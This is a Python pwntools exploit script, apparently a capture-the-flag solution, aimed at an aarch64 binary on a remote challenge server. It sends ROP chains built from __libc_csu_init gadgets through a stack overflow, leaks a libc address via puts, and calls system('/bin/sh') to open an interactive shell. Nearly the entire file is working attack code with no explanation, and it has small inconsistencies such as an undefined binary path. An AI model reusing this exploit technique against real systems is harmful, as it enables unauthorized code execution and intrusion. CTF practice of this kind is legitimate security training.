#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
context.arch = "aarch64"
#pwn_file="./"
#elf=ELF(pwn_file)
libc=ELF("./libc-2.23.so")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team", 23612)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

csu_start = 0x400864
csu_func = 0x400844
wrapper = 0x400750
puts_got = 0x411020
libc_start_main_got = 0x411008
ldp_ret = 0x400870
bss  = 0x411048
read_got = 0x411028
payload = 'a'*0x18 + p64(csu_start)
payload+= p64(0)+p64(csu_func)+ p64(0) + p64(1) + p64(puts_got)+p64(0)+p64(0)+p64(libc_start_main_got)
payload+= p64(0) + p64(wrapper)  + p64(0)*6

r.recvuntil("Give me your rop chain: ")
r.sendline(payload)
r.recvline()
w = r.recv(3)[:3]
w = u64(w+'\x00'*5)
libc.address = w - libc.sym['__libc_start_main']
print hex(libc.address)
system = libc.sym['system']
binsh = list(libc.search('/bin/sh'))[0]

print hex(system)
print hex(binsh)
payload2 = 'a'*0x18 + p64(csu_start)
payload2+= p64(0)+p64(csu_func)+ p64(0) + p64(1) + p64(puts_got)+p64(0)+p64(0)+p64(binsh)
payload2+= p64(0) + p64(wrapper)  + p64(0)*6
w = r.recv(6)
print w
# payload2 = 'a'*0x18 + p64(csu_start)
# payload2+= p64(0)+p64(csu_func)+ p64(0) + p64(1) + p64(read_got)+p64(8)+p64(bss)+p64(0)
# payload2+= p64(0) + p64(wrapper)  + p64(0)*6

r.recvuntil("Give me your rop chain: ")
r.sendline(payload2)
r.sendline(p64(system))

payload3 = 'a'*0x18 + p64(csu_start)
payload3+= p64(0)+p64(csu_func)+ p64(0) + p64(1) + p64(bss)+p64(0)+p64(0)+p64(binsh)
payload3+= p64(0) + p64(wrapper)  + p64(0)*6
r.recvuntil("Give me your rop chain: ")
r.sendline(payload3)

r.interactive()
